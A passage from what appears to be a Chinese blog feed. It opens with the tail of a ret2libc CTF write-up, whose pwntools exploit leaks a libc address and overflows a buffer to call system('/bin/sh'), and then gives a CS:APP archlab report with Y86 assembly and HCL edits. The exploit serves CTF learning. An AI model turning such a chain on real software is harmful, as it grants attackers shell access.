class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">read_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc_base=read_addr-libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr=system_addr+<span class="number">0x11e6eb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&#x27;[+]read_addr: &#x27;,hex(read_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]libc_base_addr: &#x27;,hex(libc_base))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]system_addr: &#x27;,hex(system_addr))</span></span><br><span class="line"><span class="comment">#print(&#x27;[+]bin_sh: &#x27;,hex(bin_sh_addr))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)<span class="comment">#一定要再给一次</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span>+p32(system_addr)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;ret2libc&lt;/code&gt;是一个&lt;code&gt;pwner&lt;/code&gt;必备的基础知识。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ret2libc&lt;/code&gt;为&lt;code&gt; return to libc&lt;/code&gt;的缩写，我们需要执行&lt;code&gt;libc&lt;/code&gt;函数里面的&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下面为32位程序并且带.so文件的题目:&lt;a href=&quot;https://buuoj.cn/challenges#[OGeek2019]babyrop&quot;&gt;buuctfOGeek2019]babyrop&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>archlab实验报告：y86命令使用</title>
    <link href="http://example.com/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2021/05/10/archlab%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9Ay86%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/</id>
    <published>2021-05-10T14:00:00.000Z</published>
    <updated>2021-10-25T05:51:14.729Z</updated>
    
    <content type="html"><![CDATA[<p>下载文件之后：</p><p>脑瓜子嗡嗡的，<code>writeup</code>看不懂，只能先去看看已有的实验报告，然后先做个总结——</p><p>先把里面的<code>sim.tar</code>解压了，然后进入目录之后<code>make clean</code>，<code>make</code>会在里面的所有文件该生成的文件生成了。</p><span id="more"></span><h1 id="part-A"><a href="#part-A" class="headerlink" title="part A"></a>part A</h1><p>这个部分的文件全在<code>misc</code>文件夹。</p><p>意思大概是用<code>y86</code>指令集实现<code>example.c</code>文件里面的三个函数，那也太棒了呀，我最擅长手写汇编了，汇编它虽然码起来效率低，但是能直接对底层进行操作，想想都激动<code>awa</code></p><p>要用到的指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./yis xxx.ys  </span><br><span class="line">./yas xxx.yo</span><br></pre></td></tr></table></figure><p>第一条可以理解为汇编，第二条可以理解为链接且运行。</p><h2 id="sum-list"><a href="#sum-list" class="headerlink" title="sum_list"></a>sum_list</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">sum_list</span><span class="params">(list_ptr ls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">val += ls-&gt;val;</span><br><span class="line">ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个很朴素的链表求和，用循环实现。书上有例子的，那就直接把代码写下来吧，注释上写的挺清晰了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">.pos 0#初始化</span><br><span class="line">irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">call main#执行主函数</span><br><span class="line">halt#结束</span><br><span class="line">.align 8#对齐</span><br><span class="line">ele1:#链表头</span><br><span class="line">.quad 0x00a#链表值1</span><br><span class="line">.quad ele2#连接下一个表</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0#链表值2</span><br><span class="line">.quad ele3#连接下一个表</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00#链表值3</span><br><span class="line">.quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">irmovq ele1,%rdi#传参</span><br><span class="line">call sum_list#调用函数</span><br><span class="line">ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r14</span><br><span class="line">        irmovq $0,%rax</span><br><span class="line">L2:</span><br><span class="line">        subq %r14,%rdi</span><br><span class="line">        je L4#到了NULL跳转L4返回</span><br><span class="line">        mrmovq (%rdi),%r13#取值</span><br><span class="line">        addq %r13,%rax#加给ax寄存器</span><br><span class="line">        mrmovq 8(%rdi),%rdi#下一个地址给%rdi</span><br><span class="line">        jmp     L2</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://i.loli.net/2021/05/10/xhO3Tjqgw9EGBVa.png" alt="archlab_PartA_1.png"></p><p><code>while</code>实现方式有多种，下面几种都可以，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">//循环块</span><br><span class="line">jnz L2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">jz L4</span><br><span class="line">//循环块</span><br><span class="line">jmp L2</span><br><span class="line">L4:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>……接下来读者自己想象吧</p><h2 id="rsum-list"><a href="#rsum-list" class="headerlink" title="rsum_list"></a>rsum_list</h2><p>这一次也是要一个链表求和，只是函数需要递归。</p><p>那么这次我们稍微改一下，把跳转到<code>L2</code>改成重新<code>call</code>一次就好了呗，这里不过多解释了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.pos 0#初始化</span><br><span class="line">irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">call main#执行主函数</span><br><span class="line">halt#结束</span><br><span class="line">.align 8#对齐</span><br><span class="line">ele1:#链表头</span><br><span class="line">.quad 0x00a#链表值1</span><br><span class="line">.quad ele2#连接下一个表</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0#链表值2</span><br><span class="line">.quad ele3#连接下一个表</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00#链表值3</span><br><span class="line">.quad 0#NULL</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">irmovq ele1,%rdi#传参</span><br><span class="line">irmovq $0,%rax</span><br><span class="line">call sum_list#调用函数</span><br><span class="line">ret </span><br><span class="line">sum_list:</span><br><span class="line">        irmovq $0,%r13</span><br><span class="line">        subq %r13,%rdi</span><br><span class="line">        je L4#到了NULL跳转L4返回</span><br><span class="line">        mrmovq (%rdi),%r13#取值</span><br><span class="line">        addq %r13,%rax#加给ax寄存器</span><br><span class="line">        mrmovq 8(%rdi),%rdi#下一个地址给%rdi</span><br><span class="line">        call sum_list#递归调用</span><br><span class="line">L4:</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x400</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><p>但是我这个做法在编译应该是不存在的，真正递归的话每次调用都应该用<code>rax</code>保存返回值的，但是我没有，因为我们是直接写汇编指令的，所以不必那么麻烦(其实我也不知道符不符合要求，反正能过的程序)</p><p>贴一个运行结果吧:</p><p><img src="https://i.loli.net/2021/05/11/PWqVTabiOsw6zgj.png" alt="archlab_PartA_2.png"></p><p>(PS:就感觉这个<code>lab</code>我写的挺水的，分析的东西比较少，可能还是我菜吧<code>qwq</code>)</p><h2 id="copy-block"><a href="#copy-block" class="headerlink" title="copy_block"></a>copy_block</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy_block - Copy src to dest and return xor checksum of src */</span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">copy_block</span><span class="params">(<span class="keyword">long</span> *src, <span class="keyword">long</span> *dest, <span class="keyword">long</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">long</span> val = *src++;</span><br><span class="line">*dest++ = val;</span><br><span class="line">result ^= val;</span><br><span class="line">len--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这第三个函数跟链表关系不大了，给出源地址和目的地址，源地址保存了一些值，要将源地址开始的<code>len</code>长度的数据拷贝到目的地址，并且把拷贝的值异或起来并且返回。首先<code>len</code>为循环次数没得跑，那么就先可以构建出它循环的基本框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L2:</span><br><span class="line">//……</span><br><span class="line">irmovq $1,%r9</span><br><span class="line">subq %r9,%rdx</span><br><span class="line">jne L2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>然后略去的内容无非就是赋值，异或，然后就完了…最后注意一下在main函数把三个参数传好，64位的程序前六个参数依次给<code>rdi,rsi,rdx,rcx,r8,r9</code>寄存器，那么main函数就应该是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line">irmovq src,%rdi</span><br><span class="line">irmovq dest,%rsi</span><br><span class="line">irmovq xxx,%rdx//这里的xxx自己写，写了多长的数据给多少数值</span><br><span class="line">call copy</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>那么自己再随便取一下<code>dest</code>和<code>src</code>汇编运行后就可以看到结果。</p><p>完整代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.pos 0#初始化</span><br><span class="line">irmovq stack,%rsp#初始化一个栈帧</span><br><span class="line">call main#执行主函数</span><br><span class="line">halt#结束</span><br><span class="line">.align 8#对齐</span><br><span class="line">src:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad 0xc00</span><br><span class="line">dest:</span><br><span class="line">        .quad 0x111</span><br><span class="line">        .quad 0x222</span><br><span class="line">        .quad 0x333</span><br><span class="line">#This is main function</span><br><span class="line">main:</span><br><span class="line">        irmovq src,%rdi</span><br><span class="line">        irmovq dest,%rsi</span><br><span class="line">irmovq $3,%rdx#argument len</span><br><span class="line">call copy</span><br><span class="line">ret </span><br><span class="line">copy:</span><br><span class="line">irmovq $0,%rax</span><br><span class="line">irmovq $1,%r9</span><br><span class="line">irmovq $8,%r10</span><br><span class="line">L1:</span><br><span class="line">        mrmovq (%rdi),%r8</span><br><span class="line">        xorq %r8,%rax</span><br><span class="line">        rmmovq %r8,(%rsi)</span><br><span class="line">        addq %r10,%rdi</span><br><span class="line">        addq %r10,%rsi</span><br><span class="line">        subq %r9,%rdx</span><br><span class="line">        jne L1</span><br><span class="line">        ret</span><br><span class="line">#stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果我们具体关注一下<code>111,222,333</code>内存里面的值有没有分别被修改为对应值以及返回的异或值是否与自己计算的是否相等就行了</p><p><img src="https://i.loli.net/2021/05/11/DOyk6t2KHBoQCpj.png" alt="archlab_PartA_3.png"></p><p>这样的话<code>Part A</code>就撒花啦</p><h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><p>测评方式:在<code>ptest</code>目录下执行以下命令。</p><p><code>make SIM=../seq/ssim</code></p><p>这个<code>Part B</code>大概意思就是在<code>hcl</code>文件添加一个指令<code>iaddq</code>，这个咱们照本宣科在seq-full.hcl文件对应位置加上这个指令的名称就行了，最后文件修改成这个样子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line">#<span class="comment">/* $begin seq-all-hcl */</span></span><br><span class="line">####################################################################</span><br><span class="line">#  HCL Description of Control <span class="keyword">for</span> Single Cycle Y86<span class="number">-64</span> Processor SEQ   #</span><br><span class="line">#  Copyright (C) Randal E. Bryant, David R. O<span class="number">&#x27;</span>Hallaron, <span class="number">2010</span>       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">## Your task is to implement the iaddq instruction</span><br><span class="line">## The file contains a declaration of the icodes</span><br><span class="line">#<span class="meta"># for iaddq (IIADDQ)</span></span><br><span class="line">## Your job is to add the rest of the logic to make it work</span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    C Include<span class="number">&#x27;</span>s.  Don<span class="number">&#x27;</span>t alter these                               #</span><br><span class="line">###################################################################<span class="meta">#</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">quote <span class="meta-string">&#x27;#include &lt;stdio.h&gt;&#x27;</span></span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;isa.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;#include &quot;sim.h&quot;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int sim_main(int argc, char *argv[]);&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;word_t gen_pc()&#123;return 0;&#125;&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;int main(int argc, char *argv[])&#x27;</span></span><br><span class="line">quote <span class="string">&#x27;  &#123;plusmode=0;return sim_main(argc,argv);&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Declarations.  Do <span class="keyword">not</span> change/remove/<span class="keyword">delete</span> any of these       #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Instruction Codes ############<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig INOP <span class="meta-string">&#x27;I_NOP&#x27;</span></span></span><br><span class="line">wordsig IHALT<span class="string">&#x27;I_HALT&#x27;</span></span><br><span class="line">wordsig IRRMOVQ<span class="string">&#x27;I_RRMOVQ&#x27;</span></span><br><span class="line">wordsig IIRMOVQ<span class="string">&#x27;I_IRMOVQ&#x27;</span></span><br><span class="line">wordsig IRMMOVQ<span class="string">&#x27;I_RMMOVQ&#x27;</span></span><br><span class="line">wordsig IMRMOVQ<span class="string">&#x27;I_MRMOVQ&#x27;</span></span><br><span class="line">wordsig IOPQ<span class="string">&#x27;I_ALU&#x27;</span></span><br><span class="line">wordsig IJXX<span class="string">&#x27;I_JMP&#x27;</span></span><br><span class="line">wordsig ICALL<span class="string">&#x27;I_CALL&#x27;</span></span><br><span class="line">wordsig IRET<span class="string">&#x27;I_RET&#x27;</span></span><br><span class="line">wordsig IPUSHQ<span class="string">&#x27;I_PUSHQ&#x27;</span></span><br><span class="line">wordsig IPOPQ<span class="string">&#x27;I_POPQ&#x27;</span></span><br><span class="line"># Instruction code <span class="keyword">for</span> iaddq instruction</span><br><span class="line">wordsig IIADDQ<span class="string">&#x27;I_IADDQ&#x27;</span></span><br><span class="line"></span><br><span class="line">##### Symbolic represenations of Y86<span class="number">-64</span> function codes                  ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig FNONE    <span class="meta-string">&#x27;F_NONE&#x27;</span>        # Default function code</span></span><br><span class="line"></span><br><span class="line">##### Symbolic representation of Y86<span class="number">-64</span> Registers referenced explicitly ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig RRSP     <span class="meta-string">&#x27;REG_RSP&#x27;</span>    # Stack Pointer</span></span><br><span class="line">wordsig RNONE    <span class="string">&#x27;REG_NONE&#x27;</span>   # Special value indicating <span class="string">&quot;no register&quot;</span></span><br><span class="line"></span><br><span class="line">##### ALU Functions referenced explicitly                            ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig ALUADD<span class="meta-string">&#x27;A_ADD&#x27;</span># ALU should add its arguments</span></span><br><span class="line"></span><br><span class="line">##### Possible instruction status values                             ####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig SAOK<span class="meta-string">&#x27;STAT_AOK&#x27;</span># Normal execution</span></span><br><span class="line">wordsig SADR<span class="string">&#x27;STAT_ADR&#x27;</span># Invalid memory address</span><br><span class="line">wordsig SINS<span class="string">&#x27;STAT_INS&#x27;</span># Invalid instruction</span><br><span class="line">wordsig SHLT<span class="string">&#x27;STAT_HLT&#x27;</span># Halt instruction encountered</span><br><span class="line"></span><br><span class="line">##### Signals that can be referenced by control logic ####################</span><br><span class="line"></span><br><span class="line">##### Fetch stage inputs####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig pc <span class="meta-string">&#x27;pc&#x27;</span># Program counter</span></span><br><span class="line">##### Fetch stage computations####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig imem_icode <span class="meta-string">&#x27;imem_icode&#x27;</span># icode field from instruction memory</span></span><br><span class="line">wordsig imem_ifun  <span class="string">&#x27;imem_ifun&#x27;</span> <span class="meta"># ifun field from instruction memory</span></span><br><span class="line">wordsig icode  <span class="string">&#x27;icode&#x27;</span># Instruction control code</span><br><span class="line">wordsig ifun  <span class="string">&#x27;ifun&#x27;</span># Instruction function</span><br><span class="line">wordsig rA  <span class="string">&#x27;ra&#x27;</span># rA field from instruction</span><br><span class="line">wordsig rB  <span class="string">&#x27;rb&#x27;</span># rB field from instruction</span><br><span class="line">wordsig valC  <span class="string">&#x27;valc&#x27;</span># Constant from instruction</span><br><span class="line">wordsig valP  <span class="string">&#x27;valp&#x27;</span># Address of following instruction</span><br><span class="line">boolsig imem_error <span class="string">&#x27;imem_error&#x27;</span># Error signal from instruction memory</span><br><span class="line">boolsig instr_valid <span class="string">&#x27;instr_valid&#x27;</span># Is fetched instruction valid?</span><br><span class="line"></span><br><span class="line">##### Decode stage computations####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valA<span class="meta-string">&#x27;vala&#x27;</span># Value from register A port</span></span><br><span class="line">wordsig valB<span class="string">&#x27;valb&#x27;</span># Value from <span class="keyword">register</span> B port</span><br><span class="line"></span><br><span class="line">##### Execute stage computations####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valE<span class="meta-string">&#x27;vale&#x27;</span># Value computed by ALU</span></span><br><span class="line">boolsig Cnd<span class="string">&#x27;cond&#x27;</span># Branch test</span><br><span class="line"></span><br><span class="line">##### Memory stage computations####<span class="meta">#</span></span><br><span class="line"><span class="meta">wordsig valM<span class="meta-string">&#x27;valm&#x27;</span># Value read from memory</span></span><br><span class="line">boolsig dmem_error <span class="string">&#x27;dmem_error&#x27;</span># Error signal from data memory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####################################################################</span><br><span class="line">#    Control Signal Definitions.                                   #</span><br><span class="line">####################################################################</span><br><span class="line"></span><br><span class="line">################ Fetch Stage     ###################################</span><br><span class="line"></span><br><span class="line"># Determine instruction code</span><br><span class="line">word icode = [</span><br><span class="line">imem_error: INOP;</span><br><span class="line"><span class="number">1</span>: imem_icode;# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine instruction function</span><br><span class="line">word ifun = [</span><br><span class="line">imem_error: FNONE;</span><br><span class="line"><span class="number">1</span>: imem_ifun;# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> instr_valid = icode in </span><br><span class="line">&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte?</span><br><span class="line"><span class="keyword">bool</span> need_regids =</span><br><span class="line">icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word?</span><br><span class="line"><span class="keyword">bool</span> need_valC =</span><br><span class="line">icode in 